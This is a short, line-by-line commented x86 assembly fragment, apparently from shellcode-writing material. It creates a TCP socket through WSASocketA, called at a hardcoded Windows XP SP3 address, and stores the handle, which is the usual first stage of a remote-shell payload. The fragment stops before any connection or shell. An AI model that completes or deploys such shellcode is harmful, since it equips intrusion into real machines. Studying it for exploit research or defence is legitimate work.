xor ebx,ebx             ; Zero out EBX
push ebx                ; Push 'dwFlags' parameter
push ebx                ; Push 'g' parameter
push ebx                ; Push 'lpProtocolInfo' parameter
mov bl,0x6              ; Protocol: IPPROTO_TCP=6
push ebx                ; Push 'protocol' parameter
xor ebx,ebx             ; Zero out EBX again
inc ebx                 ; Type: SOCK_STREAM=1
push ebx                ; Push 'type' parameter
inc ebx                 ; Af: AF_INET=2
push ebx                ; Push 'af' parameter
mov ebx,0x71ab8b6a      ; Address of WSASocketA() on WinXPSP3
call ebx                ; call WSASocketA()
xchg eax,esi            ; Save the returned socket handle on ESI

